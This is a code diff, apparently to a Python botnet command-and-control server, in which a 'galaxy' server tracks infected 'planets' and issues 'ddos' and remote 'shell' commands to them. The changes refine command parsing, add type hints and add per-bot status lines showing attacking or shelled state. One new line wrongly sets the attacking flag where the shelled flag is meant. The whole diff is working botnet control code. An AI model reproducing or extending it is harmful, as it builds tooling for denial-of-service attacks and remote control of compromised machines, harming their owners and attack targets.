@@ -74,7 +74,6 @@ def planet_handler():
             planet_id = token_hex(10)
             planet_ids.append(planet_id)
             planet.send(f"planet ID: {planet_id}".encode())
-            print(type(planet))
         except TimeoutError:
             pass
         except OSError as e:
@@ -185,7 +184,7 @@ def shell(cmd_shell):
         print("| ERROR: The planet ID specified does not exist.")
         shell_socket.close()
         return
-    shelled_planet = planets[int(planet_ids.index(shelled_planet_id))]
+    shelled_planet = planets[planet_ids.index(shelled_planet_id)]
     shell_buf_size = shell_buf_size * 1024
     shelled_planet.send(f"shellcmd start bufsize {shell_buf_size}".encode())
     while True:
@@ -243,12 +242,15 @@ signal(SIGINT, exit_handler)
 galaxy_port = 9999
 galaxy_socket = ""
 shell_port = 10000
+planets: list[socket.socket]
 planets = []
 planet_ips: list[tuple]
 planet_ips = []
 planet_ids: list[str]
 planet_ids = []
+planets_shelled: list[socket.socket]
 planets_shelled = []
+planets_attacking: list[socket.socket]
 planets_attacking = []
 galaxy_online = False
 
@@ -282,16 +284,23 @@ while True:
         if len(planets) > 0:
             print("| Connected planets:")
             for i, planet_ip in enumerate(planet_ips):
+                planet_attacking = False
+                planet_shelled = False
                 planet_ip_list = list(planet_ip)
                 planet_ip_port = f"{planet_ip_list[0]}:{planet_ip_list[1]}"
+                if planets[i] in planets_attacking:
+                    planet_attacking = True
+                if planets[i] in planets_shelled:
+                    planet_attacking = True
                 print(f"| {i + 1}. IP/Port: {planet_ip_port} | ID: {planet_ids[i]}")
+                print(f"| |-> Attacking: {planet_attacking} | Shelled: {planet_shelled}")
         else:
             print("| There are no planets connected.")
     elif cmd == "exit":
         exit_handler("", "", "cmd")
-    elif "ddos" in cmd:
+    elif cmd[:5] == "ddos ":
         ddos(cmd)
-    elif "shell" in cmd:
+    elif cmd[:6] == "shell ":
         shell(cmd)
     else:
         print("| Invalid command.")
